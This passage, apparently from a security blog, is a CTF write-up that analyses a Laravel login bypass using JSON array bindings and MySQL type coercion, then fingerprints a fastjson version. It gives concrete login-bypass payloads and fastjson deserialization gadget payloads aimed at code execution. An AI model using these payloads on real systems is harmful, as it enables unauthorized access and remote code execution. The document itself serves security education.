@@ -1,0 +1,269 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>那些年一起打过的CTF - Laravel 任意用户登陆Tricks分析 | 雨了个雨&#39;s blog</title>
+
+  
+  <meta name="author" content="雨了个雨">
+  
+
+  
+  <meta name="description" content="Focus On Web Security">
+  
+
+  
+  
+  <meta name="keywords" content="Web">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="那些年一起打过的CTF - Laravel 任意用户登陆Tricks分析"/>
+
+  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">雨了个雨&#39;s blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/friends">Friends</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>那些年一起打过的CTF - Laravel 任意用户登陆Tricks分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/09/22/那些年一起打过的CTF-Laravel-任意用户登陆Tricks分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-09-22T15:11:35.000Z">
+          2021-09-22
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>这里通过一道之前的CTF题目分享laravel的一个小tricks，题目是我一年多前出在npointer的。题目比较简单，一共两个考点，一个是laravel登录功能的小tricks，另一个为fastjson的利用。<br>当时题目中使用的是express，不过其实算是弱类型语言框架一个比较通用的问题，换成了使用更多的laravel为例。</p>
+<h2 id="1、Laravel-登录-tricks"><a href="#1、Laravel-登录-tricks" class="headerlink" title="1、Laravel 登录 tricks"></a>1、Laravel 登录 tricks</h2><p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321877334020.jpg" alt="-w883"></p>
+<p>打开题目后，就是一个登陆页面。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pwdRegex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;(?=.*[0-9])(?=.*[A-Z])(?=.*[a-z])(?=.*[^a-zA-Z0</span></span><br><span class="line"><span class="string">  -9]).&#123;12,30&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pwdRegex.test(data.password.value)) &#123; $(<span class="string">&quot;#msg&quot;</span>).text(<span class="string">&quot;填写的密码格式不正确，密码中必须包含大小写字母、数字、特殊字符，密码最少12位数!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在前端有密码复杂度校验，这个校验主要是为了提示该系统账户不是弱口令不用去爆破，同时经过探测可以发现不存在SQL注入。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321900154473.jpg" alt="-w1787"><br>首先抓个包，通过cookie可以发现后端使用的框架为laravel，并且只有前端校验密码复杂度，后端没有校验密码随意输入也可以登录，判断了账号和密码是否为空。</p>
+<p>现在很多系统在接收参数时支持解析多种content-type，框架会根据content-type去解析post包。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321904151167.jpg" alt="-w1321"><br>尝试把Content-Type修改为application/json后提交，提示空参数值，然后把post修改为对应的json内容,{“username”:”aa”,”password”:”aa”}。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321904596942.jpg" alt="-w1625"></p>
+<p>不再提示空参数值，说明框架是支持APPLICATION/JSON的，解析出了POST包。当弱类型语言框架支持json时，用户很有可能可以控制变量的数据类型(基础数据类型)。</p>
+<p>再回到登录功能，实现登录功能通常有两种方法<br>1、通过username查询出密码，再将提交的密码与查询出的密码对比<br>2、将username和password同时带入到SQL中，检测是否有查询出数据</p>
+<p>假如是场景1，当可以控制数据类型时，控制密码为bool true，如果登录时使用的”==”对比密码即可登录成功。但是这个场景利用成功率不高，通常在登录时后端会对密码hash后再对比，bool true hash后又变成了string，并且需要知道用户名才能够利用，<br><code>&#123;&quot;username&quot;:&quot;$admin$&quot;,&quot;password&quot;:true&#125;</code>, 构造数据包爆破了一波用户名最后失败。</p>
+<p>那么大概率还是场景2，但是在场景2中也没法绕过密码被hash的这个点。</p>
+<p>场景2，大概可以猜测出laravel控制器中的代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$username = $request-&gt;input(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">$password = $request-&gt;input(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($username) || <span class="keyword">empty</span>($password))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;empty para!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$password = md5($password);</span><br><span class="line">$user = user::where(<span class="string">&#x27;username&#x27;</span>, $username)</span><br><span class="line">    -&gt;where(<span class="string">&#x27;password&#x27;</span>, $password)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($user)&#123;</span><br><span class="line">    <span class="comment">// set session</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Login Faild!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>回到laravel中，分析下laravel的代码。在laravel中，通常使用$request-&gt;input来接收gpc参数，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params">$key = <span class="literal">null</span>, $default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> data_get(</span><br><span class="line">              <span class="keyword">$this</span>-&gt;getInputSource()-&gt;all() + <span class="keyword">$this</span>-&gt;query-&gt;all(), $key, $default</span><br><span class="line">); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>input中又调用了getInputSource方法，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getInputSource</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isJson()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;json();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> in_array(<span class="keyword">$this</span>-&gt;getRealMethod(), [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;HEAD&#x27;</span>]) ? <span class="keyword">$this</span>-&gt;query : <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在getInputSource方法中，会判断是否为json请求，如果是json请求就调用对应的json方法来解析参数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isJson</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Str::contains(<span class="keyword">$this</span>-&gt;header(<span class="string">&#x27;CONTENT_TYPE&#x27;</span>), [<span class="string">&#x27;/json&#x27;</span>, <span class="string">&#x27;+json&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>通过Content-type来判断是否为json请求，如果content-type中含有/json或+json时即认定为json请求。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">$key = <span class="literal">null</span>, $default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;json)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;json = <span class="keyword">new</span> ParameterBag((<span class="keyword">array</span>) json_decode(<span class="keyword">$this</span>-&gt;getContent(), <span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_null($key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data_get(<span class="keyword">$this</span>-&gt;json-&gt;all(), $key, $default);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在json方法中，也就是用的php自带的json_decode解析参数值(其实在Request::capture方法中，就已经设置好了json)。</p>
+<p>密码在md5后，就带入到了where中进行查询。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span>(<span class="params">$column, $operator = <span class="literal">null</span>, $value = <span class="literal">null</span>, $boolean = <span class="string">&#x27;and&#x27;</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">  Omit  .......................................................</span><br><span class="line">          <span class="keyword">if</span> (! $value <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;addBinding($value, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要关注参数绑定这一块，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addBinding</span>(<span class="params">$value, $type = <span class="string">&#x27;where&#x27;</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (! array_key_exists($type, <span class="keyword">$this</span>-&gt;bindings)) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&quot;Invalid binding type: <span class="subst">&#123;$type&#125;</span>.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;bindings[$type] = array_values(array_merge(<span class="keyword">$this</span>-&gt;bindings[$type], $va</span><br><span class="line">  lue));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;bindings[$type][] = $value;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在绑定参数时，如果我们传递过来的参数值是数组，那么会调用array_merge将它合并到bindings[‘where’]中，也就是说通过数组我们可以传多个元素到bindings中，刚好通过json可以控制变量为数组类型。</p>
+<p>能够传多个元素有什么用呢?</p>
+<p>登录的预编译SQL为, select * from users where username = ? and password = ?</p>
+<p>存在两个占位符，通过数组控制username为[“a”,”b”]，密码为”c”</p>
+<p>bindings[‘where’]的值为 array(“a”,”b”,”4a8a08f09d37b73795649038408b5f33”)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bindValues</span>(<span class="params">$statement, $bindings</span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($bindings <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">              $statement-&gt;bindValue(</span><br><span class="line">                  is_string($key) ? $key : $key + <span class="number">1</span>,</span><br><span class="line">                  $value,</span><br><span class="line">                  is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR</span><br><span class="line">); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后遍历bindings绑定值，SQL中只存在两个占位符，bindings里却有三个元素，这样就会把最后一个元素给挤出SQL中(也就是hash后的密码)。<br>最后的SQL语句为，select * from users where username = ‘a’ and password = ‘b’<br>把Hash后的密码挤出SQL后，意味着能控制密码的数据类型了。<br>能够控制账号密码的数据类型后又有什么作用呢？再回到bindValues中，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$statement-&gt;bindValue(</span><br><span class="line">                  is_string($key) ? $key : $key + <span class="number">1</span>,</span><br><span class="line">                  $value,</span><br><span class="line">                  is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR</span><br><span class="line">); &#125;</span><br></pre></td></tr></table></figure>
+<p>在bindvalue时，会判断绑定值的数据类型，如果是int那么就会使用PDO::PARAM_INT,也就是SQL中不会加单引号,不过就算不加单引号因为只能是数字也不能SQL注入。</p>
+<p>Laravel通常与MySQL搭配，虽然不能SQL注入，但是MySQL存在隐式数据类型转换功能。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#39;a1&#39; &#x3D; 0;</span><br><span class="line">+----------+</span><br><span class="line">| &#39;a1&#39; &#x3D; 0 |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;1a&#39; &#x3D; 0;</span><br><span class="line">+----------+</span><br><span class="line">| &#39;1a&#39; &#x3D; 0 |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;1a&#39; &#x3D; 1;</span><br><span class="line">+----------+</span><br><span class="line">| &#39;1a&#39; &#x3D; 1 |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;12a&#39; &#x3D; 12;</span><br><span class="line">+------------+</span><br><span class="line">| &#39;12a&#39; &#x3D; 12 |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>如果一个字符串与数字对比，字符串会尝试转换为数字后再进行对比，这个转换结果与php的intval类似。<br>如果字符串以0-9开头，会一直转换直到出现非0-9字符。<br>如果字符串不以0-9开头，会转换为0。</p>
+<p>这里有一个例外就是科学计数，如果字符串是’2e5xxxxx’转换后不是2而是200000.</p>
+<p>用户名通常为字符开头，设置为0即可。<br>密码MD5的合法字符为A-F 0-9, 如果运气比较好密码以A-F开头，也设置为0即可，如果以数字开头就需要进行爆破了。</p>
+<p>在PHP中，empty(0)为true, 所以通过username传入array设置密码，同时password传入任意字符串也绕过了empty的限制。</p>
+<p>通过JSON控制用户名，<br>{“username”:[0,0],”password”:”1”}<br>最后的SQL语句为 select * from users where username = 0 and password = 0</p>
+<p>一年前和laravel官方沟通了下这个问题，他们觉得这个还是应该由开发者来验证用户输入的数据类型，所以不准备修复这个问题，后续我就没去关注过了。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321872039702.jpg" alt="-w899"></p>
+<p>最近在写这篇文章时，又去下载最新版复现了下这个问题，发现已经无法复现了。<br>去排查了下原因，发现我邮件这人还是发布了一个commit。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/laravel/framework/commit/006873df411d28bfd03fea5e7f91a2afe3918498">https://github.com/laravel/framework/commit/006873df411d28bfd03fea5e7f91a2afe3918498</a></p>
+<p>从v8.23.0起，修复了该问题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! $value <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;addBinding(is_array($value) ? head($value) : $value, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当绑定值类型是数组时，只会将数组的第一个元素添加到bindings中，无法再将hash后的密码挤出SQL。</p>
+<p>v8.24.0起变为了，<br><code>$this-&gt;addBinding($this-&gt;flattenValue($value), &#39;where&#39;);</code><br>和23的原理也是一样的。</p>
+<p>不过input依然支持JSON，可能在另外一些场景依然存在类似的问题，类似输入卡密充值等功能，依然能够用来爆破卡密。</p>
+<p>再回到题目中，<br>{“username”:[0,0],”password”:”1”}<br>登录失败，说明密码可能是0-9开头， ​需要爆破一下，在爆破到37时进入了后台</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321949173288.jpg"></p>
+<p>{“username”:[0,37],”password”:”1”}</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950005158.jpg"></p>
+<p>在后台中也没有什么可玩的功能，唯一可玩的也就检测漏洞这个功能了。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950475819.jpg"></p>
+<p>使用该功能时提示权限不足，说明存在多个用户组，需要爆破其他的账户，接着把密码37往下跑就能跑出其他的账户。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950664523.jpg" alt="-w583"></p>
+<p>最终在478时跑出了高权限账户，数据库中真实的记录如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+----------------------+-------+</span></span><br><span class="line">| id | username | password                         | email                | group |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+----------------------+-------+</span></span><br><span class="line">|  1 | yulegeyu | 478bf953fb3a2235845bd72c8e33a132 | root@yulegeyu.com    | admin |</span><br><span class="line">|  2 | xiaoyu   | 37ee389fa5c95baee4bd6267910443fa | yulegeyu@foxmail.com | user  |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+----------------------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、Fastjson-利用"><a href="#2、Fastjson-利用" class="headerlink" title="2、Fastjson 利用"></a>2、Fastjson 利用</h2><p>(这一章节是去年写的了，当时用的是express不是laravel，所以其中涉及到了一点点express，不过不影响直接拿来用下)</p>
+<p>登录高权限账户后，再次使用检测功能<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950979786.jpg"></p>
+<p>看起来是一个类似pocsuite的功能，输入网址后可以加载插件检测是否存在该漏洞,抓个包看一下。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321951527521.jpg"></p>
+<p>调用api检测是否存在该漏洞，根据404页面发现后端使用的Springboot。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321980126429.jpg"><br>同时id参数存在SQL注入，不过是低权限注入没啥用。</p>
+<p>看到java+json，就会想到fastjson，虽然springboot默认使用的是jackson，但是很多开发者还是会用httpMessageConvert转换为fastjson使用。</p>
+<p>探测下是否使用的fastjson，</p>
+<p>1、 提交 {}<br>    返回 “msg”:”请选择漏洞!”,</p>
+<p>2、提交 {“@type”:”java.net.Inet6Address”,”val”:”127.0.0.1”}<br>    返回  Bad Request</p>
+<p>可能是因为Contoller接收RequestBody时设置了期望对象。如果Fastjson设置了期望对象,会在反序列之前检测反序列生成对象和期望对象是否有继承关系或类型是否相等，如果无关系则会在反序列之前抛出type not match异常。</p>
+<p>3、提交{“c”:{“@type”:”java.net.Inet6Address”,”val”:”127.0.0.1”}}<br>返回 “msg”:”请选择漏洞!” </p>
+<p>基本可确认是fastjson了，但是Inet6Address是一个全版本都可使用的链，需要用InetAddress才能确定fastjson是否为&lt;48的版本。</p>
+<p>4、提交{“c”:{“@type”:”java.net.InetAddress”,”val”:”asd.bayebz.dnslog.cn”}}<br>返回 Bad Request, 并且无dns请求记录。</p>
+<p>无dns请求记录并不能说明目标一定是无漏洞版本，很有可能是目标未配置dns，无网在实际场景中出现频率也很高。所以解析asd.bayebz.dnslog.cn时抛出了UnknownHostException异常，最终返回了Bad Request</p>
+<p>5、提交{“c”:{“@type”:”java.net.InetAddress”,”val”:”127.0.0.1”}}<br>返回正常     “msg”:”请选择漏洞!”,</p>
+<p>虽然无dns服务器无法解析域名，但是ip通过InetAdress还是ok的，借此能够验证目标fastjson&lt;1.2.48。</p>
+<p>6、提交 {“c”:{“@type”:”xx”}}<br>返回 Bad Request</p>
+<p>说明fastjson &gt;1.2.24。</p>
+<p>经过探测可以确认fastjson处于 1.2.24 - 1.2.48之间(实际为1.2.47版本)，现在就需要解决fastjson无网利用的问题，大部分利用都还是依靠的jndi注入，无法在当前环境下使用。<br>Fastjson无网利用基本就那几种，一个一个测就完事。</p>
+<p>7、提交 {“x”:{“@type”:”org.apache.tomcat.dbcp.dbcp.BasicDataSource”}}<br>返回 “msg”:”请选择漏洞!”,</p>
+<p>根据返回可知存在tomcat-dbcp,可使用tomcat-dbcp实现无网利用（tomcat lib目录下自带了tomcat-dbcp，所以普通tomcat能够直接使用该利用。不过spring的tomcat里没tomcat-dbcp,一开始准备直接用tomcat的更真实一点，不过后面为了方便还是用了spring手动添加dbcp)</p>
+<p>1.2.24版本以前网上的公开利用，可实现任意代码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">            &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;driverClassName&quot;: &quot;$$BCEL$$xxxxxx&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      :&quot;ddd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>现在需要借助java.lang.Class 将org.apache.tomcat.dbcp.dbcp.BasicDataSource、com.sun.org.apache.bcel.internal.util.ClassLoader加入到缓存中。</p>
+<p>修改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;xxx&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;&#125;,&quot;www&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,     &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">            &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;driverClassName&quot;: &quot;$$BCEL$$xxxxx&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      :&quot;ddd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不过在1.2.47版本中，提交后无任何反应。<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource这条利用链的入口是在getter方法 getConnection中，一般来说反序列都是调用setter方法，序列化才会调用getter方法。</p>
+<p>在fastjson&lt;=1.2.36版本中，DefaultJSONParser#parseObject中存在这样一个操作，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (object.getClass() == JSONObject.class) &#123;</span><br><span class="line">    key = key == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : key.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果反序列类为com.alibaba.fastjson.JSONObject，那么会对json中其他key调用toString()方法，</p>
